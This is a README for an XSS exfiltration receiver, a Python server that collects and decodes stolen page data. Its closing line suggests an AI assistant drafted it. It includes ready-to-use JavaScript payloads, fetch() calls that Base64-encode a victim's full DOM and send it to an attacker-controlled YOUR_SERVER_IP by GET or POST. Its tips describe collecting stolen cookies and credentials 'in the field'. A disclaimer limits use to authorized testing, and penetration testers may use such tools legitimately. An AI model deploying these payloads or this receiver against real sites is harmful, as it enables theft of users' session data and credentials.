
# 🕵️ XSS Exfiltration Receiver

This is a Python-based threaded HTTP server designed to **receive and decode exfiltrated data** (often from XSS payloads). 
It supports recursive Base64 and URL decoding, HTML saving, raw logging, and JSON-based metadata output — optionally with IP whitelisting.

---

## 🚀 Features

- ✅ URL + Base64 recursive decoding
- ✅ Decoded HTML auto-saving
- ✅ Raw payload saving
- ✅ JSON structured logs (for JIRA/ELK/etc.)
- ✅ Optional IP whitelisting
- ✅ Multithreaded (safe concurrent handling)
- ✅ Works with GET, POST, OPTIONS

---

## 🧪 How to Use

### 1. 🔧 Start the Server

```bash
python3 xssrecv.py --port 8080 --show --json-log --allow-ip 127.0.0.1
````

| Flag         | Purpose                                    |
| ------------ | ------------------------------------------ |
| `--port`     | Server port (default is 80)                |
| `--show`     | Print decoded HTML to terminal             |
| `--json-log` | Save decoded logs as structured JSONL file |
| `--allow-ip` | Restrict access to specific IP addresses   |

---

### 2. 🧨 Send a Payload to the Victim

#### Example Payload (JavaScript)

```js
fetch("http://YOUR_SERVER_IP:8080/?data=" + btoa(document.documentElement.outerHTML));
```

You can also encode the payload even further using `encodeURIComponent`:

```js
fetch("http://YOUR_SERVER_IP:8080/?data=" + encodeURIComponent(btoa(document.documentElement.outerHTML)));
```

#### POST Variant

```js
fetch("http://YOUR_SERVER_IP:8080", {
  method: "POST",
  body: "data=" + encodeURIComponent(btoa(document.documentElement.outerHTML)),
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  }
});
```

---

### 3. 📂 Output Behavior

When a payload is received:

* ✅ The parameter (e.g., `data=...`) is extracted and recursively decoded.
* ✅ If it contains `<html>` or `<!doctype`, the HTML is saved to `decoded_html/decoded_TIMESTAMP.html`.
* ✅ Raw query string is saved to `decoded_html/raw_TIMESTAMP.txt`.
* ✅ If `--json-log` is enabled, a JSON log entry is written to `decoded_html/log.jsonl`.

---

### 4. 🔍 Example Request/Output Flow

#### Example Request:

```
GET /?data=Jmx0O2h0bWwmbHQ7Ym9keT5UZXN0PC9ib2R5Pg==
```

#### Console Output:

```
[+] Raw (data): &lt;html&gt;&lt;body&gt;Test</body>
    Layer 1 (url): ...
    Layer 2 (b64): <html><body>Test</body>
[+] Final preview: '<html><body>Test'
[+] Saved HTML: decoded_html/decoded_20250705T204000Z.html
```

#### Example JSON Log:

```json
{
  "timestamp": "20250705T204000Z",
  "ip": "127.0.0.1",
  "headers": {
    "User-Agent": "...",
    "Referer": null
  },
  "raw": "data=Jmx0O2h0bWwmbHQ7Ym9keT5UZXN0PC9ib2R5Pg==",
  "decoded_layers": [
    ["url", "Jmx0O2h0bWwmbHQ7Ym9keT5UZXN0PC9ib2R5Pg=="],
    ["b64", "<html><body>Test</body>"]
  ],
  "final_preview": "<html><body>Test</body>",
  "saved_html": "decoded_html/decoded_20250705T204000Z.html"
}
```

---

## 🧷 Tips for Use in XSS

* Encode exfil payloads with `btoa()` (Base64) and optionally `encodeURIComponent()` for extra URL safety.
* Use this tool to debug and analyze stolen DOM, cookies, credentials, etc.
* Always use `HTTPS` in real-world testing to avoid browser blocks.
* Whitelist only your IP (`--allow-ip`) for safe use in the field.

---

## ⚠️ Legal Disclaimer

This tool is intended for **educational and authorized penetration testing purposes only**. Do **not** use this on systems you do not own or have explicit permission to test.

---

## 🛠 TODO / Ideas

* [ ] Optional webhook forwarding of decoded data
* [ ] TLS/HTTPS support via cert
* [ ] Replay decoded HTML in browser viewer mode

---

## 📎 License

MIT — use responsibly.

```

---

Let me know if you'd like a version of the README that includes screenshots, Docker instructions, or GitHub Actions for deployment.
```
